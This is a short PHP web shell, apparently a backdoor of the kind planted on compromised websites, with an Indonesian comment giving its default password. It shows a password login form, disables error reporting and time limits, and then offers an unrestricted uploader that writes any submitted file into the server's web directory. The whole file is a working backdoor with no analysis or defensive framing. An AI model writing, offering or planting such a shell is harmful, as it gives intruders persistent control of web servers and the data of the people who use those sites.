<?php
$shellpass = "7f41aa189d28db14692557c2c9d984ec"; // pw default: 0xNix | Bisa kalian ganti
session_start();
@error_reporting(0);
@set_time_limit(0);
function Login() {
?>
<html>
<head>
</style>
<center>
<form method="post">
<font face ='comic sans ms' size='3' color='black'>Password :
<input type="password" name="pass">
	<input type="submit" value="Login">
</form>

<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($shellpass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $shellpass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        Login();
?>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Success!!!<b><br><br>'; }
else { echo '<b>Error!!!</b><br><br>'; }
}
?>
